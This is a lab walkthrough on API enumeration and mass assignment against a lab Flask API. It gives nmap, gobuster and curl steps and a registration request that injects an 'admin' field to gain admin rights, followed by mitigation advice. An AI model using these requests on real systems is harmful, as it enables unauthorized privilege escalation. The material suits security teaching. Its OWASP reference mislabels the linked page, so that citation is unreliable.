# Lab Walkthrough: API Enumeration & Mass Assignment Vulnerability

**Type:** Guided Walkthrough  
**Category:** Web / API Security  
**Tools Used:** nmap, gobuster, curl  
**OWASP Reference:** API6 — Mass Assignment  

---

## Objective

Demonstrate API enumeration techniques and exploit a mass assignment vulnerability to gain unauthorized admin privileges on a target web application.

---

## Recon

Ran an nmap scan against the target to identify open ports and services.

- **Target:** `192.168.247.16`
- **Open Port:** `5002/tcp` — HTTP
- **Service:** Werkzeug httpd 1.0.1

Werkzeug is a Python WSGI utility library commonly used with Flask, which is a strong indicator of a Python-based REST API.

---

## API Enumeration

### Discovering API Endpoints

Initial enumeration revealed two API routes:

- `/users/v1`
- `/books/v1`

### Enumerating Users

```bash
curl http://192.168.247.16:5002/users/v1
```

This returned a list of registered users:

- `offsec`
- `admin`
- `name1`
- `name2`

### Directory Enumeration with Gobuster

Ran gobuster against the `/users/v1` path to discover further endpoints:

```bash
gobuster dir -u http://192.168.247.16:5002/users/v1 -w /usr/share/wordlists/dirb/common.txt
```

Discovered `/users/v1/admin` as a valid directory, which contained two sub-endpoints:

- `/users/v1/admin/email` — **405 Method Not Allowed**
- `/users/v1/admin/password` — **405 Method Not Allowed**

The 405 response indicates these endpoints exist but do not accept `GET` requests, suggesting other HTTP methods (`POST`, `PUT`, `PATCH`) may be valid.

---

## Exploitation — Mass Assignment

### Identifying the Vulnerability

The API exposed a registration endpoint at `POST /users/v1/register`. By including an `admin` parameter in the JSON body — a field not explicitly required by the registration form — it was possible to escalate privileges at account creation.

### Crafting the Payload

```bash
curl -X POST http://192.168.247.16:5002/users/v1/register \
     -H "Content-Type: application/json" \
     -d '{"username":"hacker","password":"pass123","admin":true}'
```

### Result

The registration succeeded. The new account was created with admin-level privileges, bypassing any intended access controls.

---

## Key Takeaways

- **API enumeration** is critical. Tools like gobuster and curl can reveal hidden endpoints and parameters that aren't exposed through the UI.
- **HTTP status codes matter.** A 405 response doesn't mean "access denied" — it means the method is wrong, which is a hint to try other HTTP verbs.
- **Mass assignment** occurs when an API binds client-supplied data directly to internal objects without filtering. If the backend doesn't explicitly whitelist accepted fields, an attacker can inject parameters like `admin`, `role`, or `is_superuser` to escalate privileges.
- **Mitigation:** APIs should enforce strict input validation and use allowlists for accepted fields during object creation or updates. Frameworks often provide built-in protections (e.g., serializer field restrictions in Django REST Framework, strong parameters in Rails).

---

## References

- [OWASP API Security Top 10 — API6: Mass Assignment](https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/)
- [PortSwigger — Mass Assignment Vulnerabilities](https://portswigger.net/web-security)
